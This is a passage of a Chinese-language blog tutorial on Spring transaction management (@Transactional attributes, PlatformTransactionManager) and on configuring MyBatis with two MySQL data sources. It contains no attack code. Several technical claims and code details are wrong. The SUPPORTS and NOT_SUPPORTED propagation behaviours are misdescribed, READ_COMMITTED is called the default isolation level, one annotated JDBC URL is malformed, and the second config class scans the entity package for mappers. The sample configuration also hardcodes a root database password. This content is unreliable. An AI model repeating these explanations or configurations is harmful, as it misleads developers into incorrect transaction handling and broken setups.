href="#6-Spring-提供的事务管理" class="headerlink" title="6. Spring 提供的事务管理"></a>6. Spring 提供的事务管理</h3><h4 id="6-1-Spring-事务管理机制概述"><a href="#6-1-Spring-事务管理机制概述" class="headerlink" title="6.1. Spring 事务管理机制概述"></a>6.1. Spring 事务管理机制概述</h4><p>Spring 事务管理提供了两种主要方式：</p><ol><li>&#x3D;&#x3D;声明式事务管理（推荐）&#x3D;&#x3D;：<ol><li>基于 AOP 代理机制，在方法执行前后自动进行事务管理，是比较推荐的一种方式</li></ol></li><li>&#x3D;&#x3D;编程式事务管理&#x3D;&#x3D;：<ol><li>编程式事务管理允许开发者手动控制事务的创建、提交和回滚。在一些特殊情况下，声明式事务管理不适用时，可以选择使用编程式事务管理。</li></ol></li></ol><hr><h4 id="6-2-声明式事务管理（推荐）"><a href="#6-2-声明式事务管理（推荐）" class="headerlink" title="6.2. 声明式事务管理（推荐）"></a>6.2. 声明式事务管理（推荐）</h4><p>声明式事务通常通过在 <code>ServiceImpl</code> 类或方法上添加 <code>@Transactional</code> 注解来配置。当 <code>Controller</code> 或其他 <code>ServiceImpl</code> 调用该方法时，它就成为了一个事务性操作（即 B 方法）。</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript"><span class="hljs-comment"># 1. 在 ServiceImpl 类上使用事务</span><br>@Service<br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserServiceImpl</span> implements UserService &#123;<br><br>    @Override<br>    @Transactional(<br>            propagation = Propagation.MANDATORY,<br>            isolation = Isolation.READ_COMMITTED,<br>            timeout = <span class="hljs-number">30</span>,<br>            rollbackFor = &#123;SQLException.<span class="hljs-keyword">class</span>, IllegalArgumentException.<span class="hljs-keyword">class</span>&#125;,<br>            noRollbackFor = &#123;IOException.<span class="hljs-keyword">class</span>, TimeoutException.<span class="hljs-keyword">class</span>&#125;<br>    )<br>    public <span class="hljs-keyword">void</span> createUser(<span class="hljs-built_in">String</span> username, <span class="hljs-built_in">String</span> password) &#123;<br>        System.out.println(<span class="hljs-string">&quot;Creating user with username: &quot;</span> + username);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment"># 2. 其他地方调用事务方法</span><br>@RestController<br>@RequestMapping(<span class="hljs-string">&quot;/users&quot;</span>)<br>public <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> &#123;<br><br>    @Autowired<br>    private UserService userService;<br><br>    @PostMapping(<span class="hljs-string">&quot;/create&quot;</span>)<br>    public <span class="hljs-built_in">String</span> createUser(@RequestParam <span class="hljs-built_in">String</span> username, @RequestParam <span class="hljs-built_in">String</span> password) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            userService.createUser(username, password);       <span class="hljs-comment"># 调用事务方法</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User created successfully!&quot;</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Failed to create user: &quot;</span> + e.getMessage();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li><font color="#00b0f0">@Transactional</font>：<ul><li>声明式事务管理，用于定制事务的行为</li><li><font color="#7030a0">标注在类上</font>：<ul><li>类中的所有 <strong>public 方法</strong>都会 <strong>继承</strong> 该事务的行为</li><li>注意：私有方法和非 public 方法不会触发事务</li></ul></li><li><font color="#7030a0">标注在方法上</font>：<ul><li>事务只会应用于标注该注解的 <strong>单一方法</strong>，不会影响其他方法。</li></ul></li></ul></li><li><font color="#00b0f0">propagation</font>：<ul><li>事务传播行为，定义了多个事务之间的交互方式</li><li><font color="#7030a0">Propagation.REQUIRED（默认）</font>：<ul><li>以 A 方法（如 <code>Controller</code> 或其他 <code>ServiceImpl</code> 中的方法）调用 <strong>B 方法（已标注 <code>@Transactional</code>的本方法）</strong>为例。</li><li>如果 A 已有事务（也被 <code>@Transactional</code> 标注），B 会加入 A 的事务，B 失败时 <strong>A 的事务回滚</strong></li><li>如果 A 没有事务，B 会创建新的事务，B 失败时 <strong>只回滚 B 的事务</strong>，A 继续执行</li></ul></li><li><font color="#7030a0">REQUIRES_NEW</font>：<ul><li>不管 A 是不是已经有事务，B 总会创建新的事务，A 的事务会被挂起，直到 B 完成才恢复</li><li>如果 B 失败，B 的事务回滚，A 不受影响，A 继续执行并提交事务</li></ul></li><li><font color="#7030a0">SUPPORTS</font>：<ul><li>如果 A 已有事务，B 会加入 A 的事务，B 失败时 <strong>不会影响 A 的事务</strong>（与 <code>REQUIRED</code> 的区别）</li><li>如果 A 没有事务，B 会以非事务方式执行，B 失败时只回滚自己的事务，A 不受影响</li></ul></li><li><font color="#7030a0">NOT_SUPPORTED</font>：<ul><li>不管 A 是不是已经有事务，B 都会以非事务方式执行，A 的事务会被挂起，直到 B 完成才恢复</li><li>如果 B 失败，B 的事务回滚，A 不受影响，A 继续执行并提交事务</li></ul></li></ul></li><li><font color="#00b0f0">isolation</font>：<ul><li>指定事务隔离级别，主要是针对相同资源（如数据库中的行、表等）的并发操作时，事务之间该如何隔离</li><li><font color="#7030a0">Isolation.READ_UNCOMMITTED</font>：读未提交</li><li><font color="#7030a0">Isolation.READ_COMMITTED</font>：读已提交，默认</li><li><font color="#7030a0">Isolation.REPEATABLE_READ</font>：可重复读</li><li><font color="#7030a0">Isolation.SERIALIZABLE</font>：可串行化</li></ul></li><li><font color="#7030a0">timeout</font>：<ul><li>事务的最大执行时间，单位为秒（<code>S</code>）。默认值为 <code>-1</code>，表示没有时间限制。</li><li>如果事务在指定时间内未完成，Spring 会自动回滚事务并抛出 <code>TransactionTimedOutException</code> 异常。</li><li>设置超时的主要原因是防止多个事务竞争同一资源时可能出现死锁。通过设置超时，可以在死锁发生时及时回滚事务，避免死锁长时间影响系统</li><li>此外，超时设置还可以帮助避免由于网络延迟导致的事务执行超时问题</li></ul></li><li><font color="#7030a0">rollbackFor</font>：<ul><li>默认情况下，Spring 只会回滚运行时异常（<code>RuntimeException</code>）和 <code>Error</code> 类型的异常。其他异常类型（如 <code>checked exceptions</code>）不会导致事务回滚。</li><li>通过 <code>rollbackFor</code> 可以扩展这一行为，指定哪些异常会导致事务回滚</li></ul></li><li><font color="#7030a0">noRollbackFor</font>：<ul><li>与 <code>rollbackFor</code> 相对，指定哪些异常不会导致事务回滚</li></ul></li></ol></blockquote><hr><h4 id="6-3-编程式事务管理"><a href="#6-3-编程式事务管理" class="headerlink" title="6.3. 编程式事务管理"></a>6.3. 编程式事务管理</h4><p>编程式事务管理允许开发者手动控制事务的创建、提交和回滚。在一些特殊情况下，声明式事务管理不适用时，可以选择使用编程式事务管理。</p><p>Spring 提供了 <code>PlatformTransactionManager</code> 接口及其实现类来手动管理事务。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> &#123;  <br>      <br>    <span class="hljs-meta">@Autowired</span>  <br>    <span class="hljs-meta">@Qualifier(&quot;transactionManager1&quot;)</span>        <span class="hljs-comment">// 我们为每个数据源都配置的 PlatformTransactionManager</span><br>    <span class="hljs-keyword">private</span> PlatformTransactionManager transactionManager;  <br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createUser</span><span class="hljs-params">(User user)</span> &#123;  <br>    <br>        <span class="hljs-comment">// 创建事务定义  </span><br>        <span class="hljs-type">DefaultTransactionDefinition</span> <span class="hljs-variable">def</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultTransactionDefinition</span>();  <br>        def.setPropagationBehavior(TransactionDefinition.PROPAGATION_REQUIRED);  <br>  <br>        <span class="hljs-comment">// 开始事务  </span><br>        <span class="hljs-type">TransactionStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> transactionManager.getTransaction(def);  <br>        <br>        <span class="hljs-keyword">try</span> &#123;  <br>            <span class="hljs-comment">// 业务逻辑  </span><br>            userRepository.save(user);  <br>  <br>            <span class="hljs-comment">// 提交事务  </span><br>            transactionManager.commit(status);  <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;  <br>            <span class="hljs-comment">// 回滚事务  </span><br>            transactionManager.rollback(status);  <br>            <span class="hljs-keyword">throw</span> e;  <span class="hljs-comment">// 重新抛出异常  </span><br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="7-Spring-提供的异步操作"><a href="#7-Spring-提供的异步操作" class="headerlink" title="7. Spring 提供的异步操作"></a>7. Spring 提供的异步操作</h3><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-基本使用"><a href="#1-基本使用" class="headerlink" title="1. 基本使用"></a>1. 基本使用</h3><h4 id="1-1-基本使用方法概述"><a href="#1-1-基本使用方法概述" class="headerlink" title="1.1. 基本使用方法概述"></a>1.1. 基本使用方法概述</h4><p>简单来说，就是我们先配<strong>置数据源</strong>，一个 IP 下的一个数据库就对应一个数据源。接着，在这个数据库中，我们需要对哪些表进行增删改查，就为每张表分别编写一个对应的 <strong>Pojo 类</strong>。</p><p>然后，通过 <strong>Mapper 接口</strong>来定义对表的操作。一个 Pojo 类对应一个 Mapper 接口，在接口中声明操作该表的所有方法。</p><p>写完方法之后，就需要<strong>编写对应的 SQL</strong> 语句，方式有两个：</p><ol><li>通过注解在 <code>Mapper</code> 接口中直接编写 SQL 语句，尽管这种方式简便，但缺乏可维护性并且不支持复杂的映射规则和 SQL 语句</li><li>通过 <code>Mapper XML</code> 文件编写 SQL 语句，并且可以设置详细的映射规则，提供了更强的灵活性，支持复杂的映射规则和 SQL 语句（一个 Mapper 接口对应一个 Mapper XML 映射文件）</li></ol><p>接下来，我们需要<strong>注册 SQL</strong>，即建立 SQL 与 Mapper 方法之间的映射关系。</p><p>最后，通过 MyBatis <strong>创建 Mapper 接口的代理对象</strong>，我们<strong>调用这个代理对象</strong>的方法，其实就是在执行与方法绑定的 SQL 语句。</p><hr><h4 id="1-2-创建-Spring-Web-项目，引入-MyBatis-相关依赖"><a href="#1-2-创建-Spring-Web-项目，引入-MyBatis-相关依赖" class="headerlink" title="1.2. 创建 Spring Web 项目，引入 MyBatis 相关依赖"></a>1.2. 创建 Spring Web 项目，引入 MyBatis 相关依赖</h4><p>这里采用 IDEA 提供的脚手架创建 Spring Boot 项目，分别勾选：</p><ol><li>&#x3D;&#x3D;Web&#x3D;&#x3D;<ol><li>Spring Web</li></ol></li><li>&#x3D;&#x3D;SQL&#x3D;&#x3D;<ol><li>JDBC API</li><li>MyBatis Framework</li><li>MySQL Driver</li></ol></li></ol><hr><h4 id="1-3-进行-MyBatis-相关配置"><a href="#1-3-进行-MyBatis-相关配置" class="headerlink" title="1.3. 进行 MyBatis 相关配置"></a>1.3. 进行 MyBatis 相关配置</h4><h5 id="1-3-1-通用配置"><a href="#1-3-1-通用配置" class="headerlink" title="1.3.1. 通用配置"></a>1.3.1. 通用配置</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-comment"># 1. 精简版</span><br><span class="hljs-params">mybatis:</span>  <br>  <span class="hljs-params">configuration:</span>  <br>    <span class="hljs-params">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">log-impl:</span> org.apache.ibatis.logging.stdout.StdOutImpl<br><br><span class="hljs-params">spring:</span>  <br>  <span class="hljs-params">datasource:</span>  <br>    <span class="hljs-params">datasource1:</span>  <br>      <span class="hljs-params">jdbc-url:</span> jdbc:mysql:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">136.7</span>:<span class="hljs-number">3306</span><span class="hljs-operator">/</span>repository1<span class="hljs-operator">?</span>useUnicode<span class="hljs-operator">=</span><span class="hljs-literal">true</span>&amp;characterEncoding<span class="hljs-operator">=</span>utf8&amp;serverTimezone<span class="hljs-operator">=</span>UTC  <br>      <span class="hljs-params">username:</span> root  <br>      <span class="hljs-params">password:</span> wq666666<br>      <span class="hljs-params">driver-class-name:</span> com.mysql.cj.jdbc.Driver<br><br>    <span class="hljs-params">datasource2:</span>  <br>      <span class="hljs-params">jdbc-url:</span> jdbc:mysql:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">136.7</span>:<span class="hljs-number">3306</span><span class="hljs-operator">/</span>repository2<span class="hljs-operator">?</span>useUnicode<span class="hljs-operator">=</span><span class="hljs-literal">true</span>&amp;characterEncoding<span class="hljs-operator">=</span>utf8&amp;serverTimezone<span class="hljs-operator">=</span>UTC  <br>      <span class="hljs-params">username:</span> root  <br>      <span class="hljs-params">password:</span> wq666666<br>      <span class="hljs-params">driver-class-name:</span> com.mysql.cj.jdbc.Driver<br><br><br><span class="hljs-comment"># 2. 注释版</span><br><span class="hljs-params">mybatis:</span>  <br>  <span class="hljs-params">configuration:</span>  <br>    <span class="hljs-params">map-underscore-to-camel-case:</span> <span class="hljs-literal">true</span>                         <span class="hljs-operator">//</span> 开启自动驼峰命名映射<br>    <span class="hljs-params">log-impl:</span> org.apache.ibatis.logging.stdout.StdOutImpl      <span class="hljs-operator">//</span> 控制台输出 SQL 日志<br><span class="hljs-params">spring:</span>  <br>  <span class="hljs-params">datasource:</span>  <br>    <span class="hljs-params">datasource1:</span>                                               <span class="hljs-operator">//</span> 数据源<span class="hljs-number">1</span>（名称自定义）<br>      <span class="hljs-params">jdbc-url:</span> jdbc:mysql:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">136.7</span>:<span class="hljs-number">3306</span><span class="hljs-operator">/</span>repository1<span class="hljs-operator">?</span>   <span class="hljs-operator">//</span> 数据源位置，精确到库           useUnicode<span class="hljs-operator">=</span><span class="hljs-literal">true</span>&amp;characterEncoding<span class="hljs-operator">=</span>utf8&amp;serverTimezone<span class="hljs-operator">=</span>UTC  <br>      <span class="hljs-params">username:</span> root                                           <span class="hljs-operator">//</span> MySQL 用户<br>      <span class="hljs-params">password:</span> wq666666                                       <span class="hljs-operator">//</span> MySQL 用户密码<br>      <span class="hljs-params">driver-class-name:</span> com.mysql.cj.jdbc.Driver              <span class="hljs-operator">//</span> MySQL <span class="hljs-number">8.0</span> 以上的 JDBC 驱动<br>    <span class="hljs-params">datasource2:</span>                                               <span class="hljs-operator">//</span> 数据源<span class="hljs-number">2</span>（名称自定义）<br>      <span class="hljs-params">jdbc-url:</span> jdbc:mysql:<span class="hljs-operator">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">136.7</span>:<span class="hljs-number">3306</span><span class="hljs-operator">/</span><span class="hljs-operator">?</span>repository2<span class="hljs-operator">?</span>useUnicode<span class="hljs-operator">=</span><span class="hljs-literal">true</span>&amp;characterEncoding<span class="hljs-operator">=</span>utf8&amp;serverTimezone<span class="hljs-operator">=</span>UTC  <br>      <span class="hljs-params">username:</span> root  <br>      <span class="hljs-params">password:</span> wq666666<br>      <span class="hljs-params">driver-class-name:</span> com.mysql.cj.jdbc.Driver  <br><span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;</span><br><span class="hljs-string">1. jdbc:mysql://192.168.136.7:3306/repository1?useUnicode=true&amp;characterEncoding=utf8&amp;serverTimezone=UTC  </span><br><span class="hljs-string">1. jdbc:mysql</span><br><span class="hljs-string">1. 使用 JDBC 连接到 MySQL</span><br><span class="hljs-string">2. repository1</span><br><span class="hljs-string">1. 使用的库的名称，让我们无需 use &lt;repository-name&gt;</span><br><span class="hljs-string">3. useUnicode=true</span><br><span class="hljs-string">1. 表示启用 Unicode 字符集支持。</span><br><span class="hljs-string">4. characterEncoding=utf8</span><br><span class="hljs-string">1. 指定数据库连接的字符编码方式为 UTF-8</span><br><span class="hljs-string">5. serverTimezone=UTC  </span><br><span class="hljs-string">1. 指定 MySQL 服务器的时区为 UTC（协调世界时）</span><br><span class="hljs-string">&quot;</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><hr><h5 id="1-3-2-配置类配置"><a href="#1-3-2-配置类配置" class="headerlink" title="1.3.2. 配置类配置"></a>1.3.2. 配置类配置</h5><p>&#x3D;&#x3D;1.数据源 1 配置类&#x3D;&#x3D;<br>注意三处：Mapper 接口位置、Mapper XML 位置、Model Entity Pojo 位置</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@Configuration</span>                                <span class="hljs-comment">// 表明是一个配置类</span><br><span class="hljs-meta">@MapperScan(basePackages = <span class="hljs-string">&quot;com.example.spring_data_mybatis.mapper.datasource1&quot;</span>, sqlSessionFactoryRef = <span class="hljs-string">&quot;sqlSessionFactory1&quot;</span>)</span>  <span class="hljs-comment">// 扫描 Mapper 接口（生成代理对象，注册 SQL 与 Mapper 之间的映射（注册方式 2）），指定 sqlSessionFactory</span><br><span class="hljs-meta">@EnableTransactionManagement</span>                  <span class="hljs-comment">// 启用 Spring 的声明式事务管理</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSource1Config</span> &#123;              <span class="hljs-comment">// DataSource1 的配置类</span><br><br>    <span class="hljs-meta">@Primary</span><br>    <span class="hljs-meta">@Bean(name = <span class="hljs-string">&quot;dataSource1&quot;</span>)</span><br>    <span class="hljs-meta">@ConfigurationProperties(prefix = <span class="hljs-string">&quot;spring.datasource.datasource1&quot;</span>)</span> <br>    <span class="hljs-keyword">public</span> DataSource dataSource1() &#123;         <span class="hljs-comment">// 定义了一个名为 “dataSource1” 的数据源 Bean</span><br>        <span class="hljs-keyword">return</span> DataSourceBuilder.create().build();<br>    &#125;<br><br>    <span class="hljs-meta">@Primary</span><br>    <span class="hljs-meta">@Bean(name = <span class="hljs-string">&quot;sqlSessionFactory1&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> SqlSessionFactory sqlSessionFactory1(<span class="hljs-meta">@Qualifier(<span class="hljs-string">&quot;dataSource1&quot;</span>)</span> DataSource dataSource) throws Exception &#123;                            <span class="hljs-comment">// 定义了本数据源的 SqlSessionFactory</span><br>    <br>        SqlSessionFactoryBean sessionFactory = new SqlSessionFactoryBean();<br>        <br>        sessionFactory.setDataSource(dataSource);<br>        <br>        sessionFactory.setMapperLocations(new PathMatchingResourcePatternResolver()  <br>        .getResources(<span class="hljs-string">&quot;classpath*:mapper/dataSource1/*.xml&quot;</span>));      <span class="hljs-comment">// DataSource1 Mapper XML 的位置，注册 SQL 与 Mapper 之间的映射（注册方式2）</span><br>        <br>sessionFactory.setTypeAliasesPackage(<br><span class="hljs-string">&quot;com.example.spring_data_mysql.model.entity.datasource1&quot;</span>);  <span class="hljs-comment">// DataSource1 Entity Pojo 的位置，为全类名起类型别名</span><br><br>        <span class="hljs-keyword">return</span> sessionFactory.getObject();<br>    &#125;<br><br>    <span class="hljs-meta">@Primary</span><br>    <span class="hljs-meta">@Bean(name = <span class="hljs-string">&quot;transactionManager1&quot;</span>)</span><br>    <span class="hljs-keyword">public</span> PlatformTransactionManager transactionManager1(<span class="hljs-meta">@Qualifier(<span class="hljs-string">&quot;dataSource1&quot;</span>)</span> DataSource dataSource) &#123;                                 <span class="hljs-comment">// 定义了本数据源的 事务管理器</span><br>        <span class="hljs-keyword">return</span> new DataSourceTransactionManager(dataSource);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>每个数据源（<code>dataSource1</code>、<code>dataSource2</code>）都需要创建<strong>独立的</strong>配置类，并进行相应的配置</li><li>如果 SQL 写在 Mapper XML 中，则必须使用 <code>setMapperLocations</code> 来注册 SQL 与 Mapper 的映射。</li><li>如果 SQL 是通过注解写在 Mapper 接口中的，则需要使用 <code>@Mapper</code> 注解来扫描接口，这样不仅可以生成接口的 代理对象，还能够自动注册 SQL 与 Mapper 之间的映射，<strong>实现一举两得</strong>。</li><li>无论 SQL 写在哪里，都<strong>必须使用</strong> <code>@MapperScan</code> 来扫描 <code>Mapper</code> 接口，确保生成对应的代理对象</li></ol></blockquote><p>&#x3D;&#x3D;2.数据源 2 创建配置类&#x3D;&#x3D;</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-meta">@Configuration</span>  <br><span class="hljs-meta">@MapperScan(basePackages = <span class="hljs-string">&quot;com.example.spring_data_mybatis.model.entity.datasource2&quot;</span>,  </span><br><span class="hljs-meta">        sqlSessionFactoryRef = <span class="hljs-string">&quot;sqlSessionFactory2&quot;</span>)</span>  <br><span class="hljs-meta">@EnableTransactionManagement</span>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataSource2Config</span> &#123;  <br>  <br>    <span class="hljs-meta">@Bean(name = <span class="hljs-string">&quot;dataSource2&quot;</span>)</span>  <br>    <span class="hljs-meta">@ConfigurationProperties(prefix = <span class="hljs-string">&quot;spring.datasource.datasource2&quot;</span>)</span>  <br>    <span class="hljs-keyword">public</span> DataSource dataSource2() &#123;  <br>        <span class="hljs-keyword">return</span> DataSourceBuilder.create().build();  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Bean(name = <span class="hljs-string">&quot;sqlSessionFactory2&quot;</span>)</span>  <br>    <span class="hljs-keyword">public</span> SqlSessionFactory sqlSessionFactory2(<span class="hljs-meta">@Qualifier(<span class="hljs-string">&quot;dataSource2&quot;</span>)</span> DataSource dataSource) throws Exception &#123;  <br>        SqlSessionFactoryBean sessionFactory = new SqlSessionFactoryBean();  <br>        sessionFactory.setDataSource(dataSource);  <br>        sessionFactory.setMapperLocations(new PathMatchingResourcePatternResolver()  <br>                .getResources(<span class="hljs-string">&quot;classpath*:mapper/dataSource2/*.xml&quot;</span>));  <br>        sessionFactory.setTypeAliasesPackage(<span class="hljs-string">&quot;com.example.spring_data_mysql.model.entity.datasource2&quot;</span>);  <br>        <span class="hljs-keyword">return</span> sessionFactory.getObject();  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Bean(name = <span class="hljs-string">&quot;transactionManager2&quot;</span>)</span>  <br>    <span class="hljs-keyword">public</span> PlatformTransactionManager transactionManager2(<span class="hljs-meta">@Qualifier(<span class="hljs-string">&quot;dataSource2&quot;</span>)</span> DataSource dataSource) &#123;  <br>        <span class="hljs-keyword">return</span> new DataSourceTransactionManager(dataSource);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><hr><h5 id="1-3-3-连接池配置"><a href="#1-3-3-连接池配置" class="headerlink" title="1.3.3. 连接池配置"></a>1.3.3. 连接池配置</h5><p>Spring Boot 默认使用 <strong>HikariCP</strong> 作为连接池，其默认配置已经能够满足大多数场景下的性能和高可用性要求。如果在特定情况下有特殊需求，也可以根据实际情况自定义连接池配置。</p><hr><h4 id="1-4-编写-Model-Entity-Pojo-类"><a href="#1-4-编写-Model-Entity-Pojo-类" class="headerlink" title="1.4. 编写 Model Entity Pojo 类"></a>1.4. 编写 Model Entity Pojo 类</h4><p>在 ORM（对象关系映射）中，Entity Pojo 类用于承载和传递与业务相关的数据。通过 Entity Pojo类，我们可以将查询结果映射到类的属性，或者将类的属性保存到数据库中。</p><p>每个 Entity Pojo 类对应一个数据库表，充当该表的数据载体。一个 Entity Pojo 对象对应数据库中的一行数据，类中的属性对应表中的列字段。</p><p>与普通的 Pojo 类不同，在 ORM 中，Entity Pojo 类通常仅包含基本的私有属性、最基本的构造方法、setter、getter、toString 等方法。它不得包含复杂的业务逻辑或操作，避免引入额外的逻辑。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-title class_"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><br>    <span class="hljs-comment">// 1. 私有属性</span><br>    <span class="hljs-keyword">private</span> Integer id;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> firstName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> lastName;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">String</span> email;<br><br>  <span class="hljs-comment">// 2. 构造方法（无参构造、有参构造）</span><br>    <br>    <span class="hljs-comment">// 3. Getter 方法</span><br>    <br>    <span class="hljs-comment">// 4. Setter 方法</span><br>    <br>    <span class="hljs-comment">// 5. toString 方法</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>[!NOTE] 注意事项</p><ol><li>Entity Pojo 类名应与数据库表名对应，以便直观且方便地进行维护。例如：<code>t_car</code> 对应 <code>Car</code>，<code>car</code> 对应 <code>Car</code>。</li><li>对于私有属性，建议使用包装类进行声明，因为包装类能够更好地处理 <code>null</code> 值</li><li>私有属性的名称应与数据库表中的列名对应，通常采用驼峰命名法。例如：<code>first_name</code> 对应 <code>firstName</code>，<code>email</code> 对应 <code>email</code></li><li>对于 Entity Pojo 类，一般不需要也不应该加 <code>@Component</code> 注解，因为他们仅仅只是数据载体</li></ol></blockquote><hr><h4 id="1-5-编写-Mapper-接口"><a href="#1-5-编写-Mapper-接口" class="headerlink" title="1.5. 编写 Mapper 接口"></a>1.5. 编写 Mapper 接口</h4><h5 id="1-5-1-Mapper-接口概述"><a 